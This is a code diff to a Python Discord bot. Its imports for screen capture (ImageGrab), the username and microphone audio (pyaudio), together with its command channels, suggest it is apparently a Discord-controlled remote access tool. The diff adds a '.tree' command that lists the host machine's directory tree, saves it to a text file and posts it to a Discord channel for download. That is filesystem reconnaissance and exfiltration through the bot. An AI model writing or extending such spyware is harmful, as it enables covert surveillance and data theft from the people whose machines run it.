@@ -5,6 +5,7 @@ import os
 import sys
 from PIL import ImageGrab
 from pathlib import Path
+from itertools import islice
 import time
 from getpass import getuser
 import pyaudio
@@ -143,7 +144,31 @@ async def on_message(message):
     elif message.content == '.tree':
         await message.delete()
         if message.channel.id == channel_ids['file']:
-            print('yes')
+            tree_messages = []
+
+            dir_path = Path('/'.join(working_directory))
+            tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
+            with open('tree.txt', 'w', encoding='utf-8') as system_tree:
+                system_tree.write(str(dir_path) + '\n')
+
+            length_limit = sys.maxsize
+            iterator = tree(Path('/'.join(working_directory)))
+
+            tree_message_content = '```^\n'
+            for line in islice(iterator, length_limit):
+                with open('tree.txt', 'a+', encoding='utf-8') as system_tree:
+                    system_tree.write(line + '\n')
+                if len(tree_message_content) > 1800:
+                    tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
+                    tree_message_content = '```'
+                else:
+                    tree_message_content += str(line) + '\n'
+            if tree_message_content != '```':
+                tree_messages.append(await message.channel.send(tree_message_content + '```'))
+            
+            reactionMsg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
+            await reactionMsg.add_reaction('📥')
+            await reactionMsg.add_reaction('🔴')
         else:
             reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
